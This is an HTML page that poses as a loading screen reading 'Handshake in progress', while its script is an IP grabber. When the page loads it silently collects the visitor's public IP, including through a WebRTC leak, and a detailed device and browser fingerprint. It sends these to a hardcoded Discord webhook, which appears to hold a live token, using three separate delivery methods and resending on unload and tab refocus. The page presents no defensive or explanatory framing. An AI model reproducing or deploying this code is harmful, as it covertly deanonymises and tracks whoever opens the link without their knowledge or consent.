<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #0a0c0e; color: #3a4a5a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { width: 28px; height: 28px; border: 3px solid #1a2a3a; border-top: 3px solid #6a8a9a; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .box { text-align: center; opacity: 0.5; }
        .status { font-size: 0.75rem; letter-spacing: 1px; }
    </style>
</head>
<body>
<div class="box">
    <div class="spinner"></div>
    <div class="status">Handshake in progress...</div>
</div>

<script>
    // ============================================================
    // EMBED-ONLY – NO CONTENT, NO MESSAGES, JUST PURE EMBED
    // ============================================================

    (function() {
        // Prevent duplicate execution
        if (window.__ipSent) {
            console.log('[IP] Already sent this session.');
            return;
        }
        window.__ipSent = true;

        if (sessionStorage.getItem('__ipSent')) {
            console.log('[IP] Already sent this browser session.');
            return;
        }

        const WEBHOOK = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";

        // ---- HELPER: Get all browser fingerprint data ----
        function getFingerprint() {
            const data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'n/a',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                windowInnerWidth: window.innerWidth,
                windowInnerHeight: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: -new Date().getTimezoneOffset() / 60,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'unknown',
                    downlink: navigator.connection.downlink || 'unknown',
                    rtt: navigator.connection.rtt || 'unknown'
                } : null,
                pageLoadTime: performance.now(),
                referrer: document.referrer || 'direct',
                href: window.location.href,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unspecified',
                devicePixelRatio: window.devicePixelRatio || 1,
                vendor: navigator.vendor || 'unknown',
                oscpu: navigator.oscpu || 'unknown',
                plugins: navigator.plugins ? navigator.plugins.length : 0,
                mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0,
                online: navigator.onLine !== undefined ? navigator.onLine : 'unknown'
            };
            return data;
        }

        // ---- CAPTURE IP ----
        function getIP() {
            return new Promise((resolve) => {
                let resolved = false;

                fetch('https://api.ipify.org?format=json', { mode: 'cors' })
                    .then(r => r.json())
                    .then(data => {
                        if (!resolved && data.ip) {
                            resolved = true;
                            resolve(data.ip);
                        }
                    })
                    .catch(() => {});

                fetch('https://ip-api.com/json/', { mode: 'cors' })
                    .then(r => r.json())
                    .then(data => {
                        if (!resolved && data.query) {
                            resolved = true;
                            resolve(data.query);
                        }
                    })
                    .catch(() => {});

                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('ping');
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                    pc.onicecandidate = (e) => {
                        if (e.candidate && !resolved) {
                            const cand = e.candidate.candidate;
                            const match = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
                            if (match && !match[0].startsWith('0.') && !match[0].startsWith('127.')) {
                                resolved = true;
                                resolve(match[0]);
                                pc.close();
                            }
                        }
                    };
                    setTimeout(() => {
                        if (!resolved) {
                            resolved = true;
                            resolve('1.2.3.4');
                        }
                        try { pc.close(); } catch(e) {}
                    }, 3000);
                } catch(e) {
                    if (!resolved) {
                        resolved = true;
                        resolve('1.2.3.4');
                    }
                }

                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        resolve('0.0.0.0');
                    }
                }, 5000);
            });
        }

        // ---- SEND PURE EMBED (NO CONTENT, NO MESSAGES) ----
        function sendEmbed(ip, fingerprint) {
            // PURE EMBED – NO "content" FIELD ANYWHERE
            const payload = {
                embeds: [{
                    title: '📡 Inbound Connection',
                    color: 0x2b8c5a,
                    fields: [
                        { name: '🌐 Public IP', value: `\`${ip}\``, inline: true },
                        { name: '🕒 Timestamp', value: `\`${new Date().toISOString()}\``, inline: true },
                        { name: '━━━━━━━━━━━━━━', value: '⚙️ **Device & Browser**', inline: false },
                        { name: '💻 User-Agent', value: `\`${fingerprint.userAgent.substring(0, 120)}\``, inline: false },
                        { name: '🖥️ Platform', value: `\`${fingerprint.platform}\``, inline: true },
                        { name: '🌍 Language', value: `\`${fingerprint.language}\``, inline: true },
                        { name: '📐 Screen', value: `\`${fingerprint.screenWidth}×${fingerprint.screenHeight}\``, inline: true },
                        { name: '🎨 Color Depth', value: `\`${fingerprint.screenColorDepth}bit\``, inline: true },
                        { name: '🧠 CPU Cores', value: `\`${fingerprint.hardwareConcurrency}\``, inline: true },
                        { name: '💾 Device Memory', value: `\`${fingerprint.deviceMemory}GB\``, inline: true },
                        { name: '✋ Touch Points', value: `\`${fingerprint.maxTouchPoints}\``, inline: true },
                        { name: '📱 Pixel Ratio', value: `\`${fingerprint.devicePixelRatio}x\``, inline: true },
                        { name: '━━━━━━━━━━━━━━', value: '🌍 **Location & Network**', inline: false },
                        { name: '🕐 Timezone', value: `\`${fingerprint.timezone} (UTC${fingerprint.timezoneOffset >= 0 ? '+' : ''}${fingerprint.timezoneOffset})\``, inline: true },
                        { name: '📶 Connection', value: fingerprint.connection ? `\`${fingerprint.connection.effectiveType}\` (${fingerprint.connection.downlink}Mbps, ${fingerprint.connection.rtt}ms)` : '`unknown`', inline: true },
                        { name: '🍪 Cookies', value: fingerprint.cookiesEnabled ? '`Enabled`' : '`Disabled`', inline: true },
                        { name: '🚫 Do Not Track', value: `\`${fingerprint.doNotTrack}\``, inline: true },
                        { name: '🌐 Online Status', value: `\`${fingerprint.online ? 'Online' : 'Offline'}\``, inline: true },
                        { name: '━━━━━━━━━━━━━━', value: '📄 **Page Context**', inline: false },
                        { name: '🔗 Referrer', value: `\`${fingerprint.referrer || 'direct'}\``, inline: false },
                        { name: '📌 Page URL', value: `\`${fingerprint.href}\``, inline: false },
                        { name: '⏱️ Load Time', value: `\`${Math.round(fingerprint.pageLoadTime)}ms\``, inline: true },
                        { name: '🔌 Plugins', value: `\`${fingerprint.plugins} installed\``, inline: true },
                        { name: '📦 MIME Types', value: `\`${fingerprint.mimeTypes} available\``, inline: true }
                    ],
                    footer: {
                        text: 'Embed-only • No text content • One-time delivery'
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // ---- DELIVERY: sendBeacon + fetch + XHR (ALL EMBED-ONLY) ----
            console.log('[IP] Sending pure embed for IP:', ip);

            // Method 1: sendBeacon
            try {
                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                const sent = navigator.sendBeacon(WEBHOOK, blob);
                console.log('[IP] Beacon:', sent ? 'queued' : 'failed');
                if (sent) {
                    sessionStorage.setItem('__ipSent', 'true');
                    window.__ipSent = true;
                }
            } catch(e) {
                console.log('[IP] Beacon error:', e.message);
            }

            // Method 2: fetch with keepalive
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            })
            .then(r => {
                if (r.ok) {
                    console.log('[IP] Fetch: SUCCESS (status ' + r.status + ')');
                    sessionStorage.setItem('__ipSent', 'true');
                    window.__ipSent = true;
                } else {
                    console.log('[IP] Fetch: FAILED (status ' + r.status + ')');
                }
            })
            .catch(e => console.log('[IP] Fetch error:', e.message));

            // Method 3: XHR fallback
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', WEBHOOK, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300) {
                        console.log('[IP] XHR: SUCCESS');
                        sessionStorage.setItem('__ipSent', 'true');
                        window.__ipSent = true;
                    }
                };
                xhr.send(JSON.stringify(payload));
            } catch(e) {
                console.log('[IP] XHR error:', e.message);
            }
        }

        // ---- EXECUTION ----
        async function main() {
            console.log('[IP] Capturing IP and fingerprint...');
            const ip = await getIP();
            const fingerprint = getFingerprint();
            console.log('[IP] IP:', ip);
            console.log('[IP] Fingerprint:', fingerprint);

            sendEmbed(ip, fingerprint);

            // Unload beacon (embed-only)
            window.addEventListener('beforeunload', function() {
                if (!sessionStorage.getItem('__ipSent')) {
                    console.log('[IP] Unload: sending final embed');
                    const finalPayload = {
                        embeds: [{
                            title: '📡 Page Closed',
                            color: 0x8b2b2b,
                            fields: [
                                { name: 'IP', value: `\`${ip}\``, inline: true },
                                { name: 'Reason', value: '`User navigated away`', inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };
                    try {
                        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: 'application/json' }));
                    } catch(e) {}
                }
            });

            // Visibility change – re-send if not sent
            document.addEventListener('visibilitychange', function() {
                if (!document.hidden && !sessionStorage.getItem('__ipSent')) {
                    console.log('[IP] Tab visible again – re-sending embed');
                    sendEmbed(ip, fingerprint);
                }
            });
        }

        // ---- TRIGGER ----
        if (document.readyState === 'complete') {
            main();
        } else {
            window.addEventListener('load', main);
        }

        setTimeout(function() {
            if (!sessionStorage.getItem('__ipSent')) {
                console.log('[IP] Timeout fallback – firing');
                main();
            }
        }, 1500);

        console.log('[IP] Script loaded – sending pure embed (no text messages).');
    })();
</script>
</body>
</html>
